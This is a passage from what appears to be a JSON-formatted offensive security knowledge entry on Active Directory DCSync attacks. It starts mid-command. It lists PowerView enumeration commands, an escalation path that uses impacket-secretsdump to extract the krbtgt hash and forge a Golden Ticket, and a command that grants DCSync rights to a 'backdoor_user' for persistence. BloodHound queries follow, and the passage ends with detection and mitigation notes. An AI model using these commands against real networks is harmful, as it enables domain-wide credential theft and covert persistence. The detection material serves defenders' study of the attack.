Where-Object {$_.SecurityIdentifier -like '*Exchange*'}\n\n2. Backup operators:\n# Backup software given replication rights\nGet-ObjectAcl -DistinguishedName 'DC=corp,DC=com' | Where-Object {$_.SecurityIdentifier -like '*backup*' -and $_.ObjectAceType -match 'Replication'}\n\n3. Service accounts:\n# Custom service accounts with excessive permissions\nGet-ObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | Where-Object {$_.ObjectAceType -match 'Replication' -and $_.SecurityIdentifier -notlike '*-512' -and $_.SecurityIdentifier -notlike '*-519'}\n\nPRIVILEGE ESCALATION PATH:\n\n1. Compromise low-privileged user\n2. Check DCSync rights: Get-ObjectAcl...\n3. If user/group has DCSync → Extract credentials:\nimpacket-secretsdump -just-dc-user krbtgt 'corp.com/compromised_user:password@192.168.50.70'\n4. Create Golden Ticket with krbtgt hash\n5. Achieve domain-wide persistence\n\nGRANT DCSYNC RIGHTS (for persistence):\n\n# Grant DCSync to specific user (requires DA):\nAdd-DomainObjectAcl -TargetIdentity 'DC=corp,DC=com' -PrincipalIdentity backdoor_user -Rights DCSync -Verbose\n\n# Remove DCSync rights:\nRemove-DomainObjectAcl -TargetIdentity 'DC=corp,DC=com' -PrincipalIdentity backdoor_user -Rights DCSync\n\nBLOODHOUND INTEGRATION:\n\nCollect ACL data:\nInvoke-BloodHound -CollectionMethod ACL,ObjectProps\n\nBloodHound Cypher query (find DCSync paths):\nMATCH p=(u:User)-[:MemberOf*1..]->(g:Group)-[:GenericAll|WriteDacl]->(d:Domain) RETURN p\n\nFind users with direct DCSync:\nMATCH (u)-[:DCSync]->(d:Domain) RETURN u.name, d.name\n\nDETECTION:\n\n- Monitor Event ID 4662 (operation performed on object)\n  - Object Type: {19195a5b-6da0-11d0-afd3-00c04fd930c9} (domainDNS)\n  - Properties: {1131f6aa...} (DS-Replication-Get-Changes)\n- Alert on DCSync from non-DC computers\n- Baseline normal replication sources (only DCs should replicate)\n- Monitor ACL changes on domain root:\n  - Event ID 5136 (directory service object modified)\n  - Attribute: nTSecurityDescriptor\n\nMITIGATION:\n\n- Regularly audit DCSync privileges: Get-ObjectAcl...\n- Remove unnecessary DCSync grants\n- Use Protected Users group (prevents credential delegation)\n- Implement tiered administration (separate DA for each task)\n- Monitor replication traffic from non-DCs\n- Enable Advanced Threat Analytics (ATA) for DCSync detection\n\nTIME ESTIMATE:\nPrivilege enumeration: 5-15 seconds\nSID resolution: 2-5 seconds per SID\nTotal: 10-30 seconds"
    }
  ]
}
